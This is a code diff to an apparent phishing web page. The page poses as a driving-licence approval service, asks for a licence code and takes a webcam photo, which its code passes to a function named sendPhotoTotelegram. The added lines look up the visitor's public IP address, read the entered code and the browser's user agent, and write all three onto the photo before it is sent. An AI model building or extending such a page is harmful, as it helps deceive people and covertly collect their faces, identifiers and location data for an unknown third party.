@@ -39,7 +39,7 @@
     </style>
 </head>
 <body>
-    <button class="menu-button" onclick="window.location.href='index.html'">Go to Menu</button>
+    <button class="menu-button" onclick="window.location.href='menu.html'">Go to Menu</button>
     <h1>Please enter your driving license code in the box below for a request to remove suspense. A photo will be taken for license approval.</h1>
     <form onsubmit="handleSubmit(event)">
         <label for="userInput">Enter Information:</label>
@@ -60,10 +60,15 @@
                 canvas.height = video.videoHeight;
                 content.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Add a message to the image
-                content.font = '30px Arial';
+                // Add text overlay with user information
+                const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Unknown IP');
+                const userInput = document.getElementById('userInput').value;
+                const deviceName = navigator.userAgent;
+                content.font = '20px Arial';
                 content.fillStyle = 'red';
-                content.fillText('License Approval', 10, 50);
+                content.fillText(`IP: ${ip}`, 10, 30);
+                content.fillText(`Code: ${userInput}`, 10, 60);
+                content.fillText(`Device: ${deviceName}`, 10, 90);
 
                 canvas.toBlob(blob => {
                     sendPhotoTotelegram(blob);
